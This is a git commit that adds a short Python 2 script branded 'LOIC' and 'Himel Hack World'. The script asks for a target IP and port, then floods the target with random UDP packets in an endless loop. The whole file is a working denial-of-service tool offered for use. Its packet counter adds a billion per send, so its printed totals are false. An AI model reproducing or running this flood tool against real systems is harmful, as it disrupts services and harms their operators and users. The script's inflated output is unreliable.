e9ad5091f53db54f23ee201d4b77a6b8e00f909c
himelgazi <73532322+himelgazi@users.noreply.github.com>
2020-10-27 18:13:35 +0600

    Add files via upload

---
+++ LO1C.py
@@ -0,0 +1,38 @@
+
+import sys, os, time, socket, random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+os.system('clear')
+os.system('figlet LOIC')
+print
+print 'Welcome To Himel Hack World'
+print '\x1b[32;1m<=======================================>'
+print '\x1b[34;1m||==>D-Dragon its not a name its brand<=||'
+print '\x1b[32;1m<=======================================>'
+
+
+
+
+print 'RECODE=Himel Gazi'
+print
+ip = raw_input('INPUT TARGET IP ===> ')
+port = input('Port       ===> ')
+os.system('clear')
+os.system('figlet Loading..')
+print 'takes 5 seconds'
+time.sleep(5)
+sent = 0
+while True:
+    sock.sendto(bytes, (ip, port))
+    sent = sent + 1000000000
+    port = port + 0
+    print '\x1b[32;1mSend %s packet to %s throught port:%s' % (sent, ip, port)
+    if port == 65534:
+        port = 0
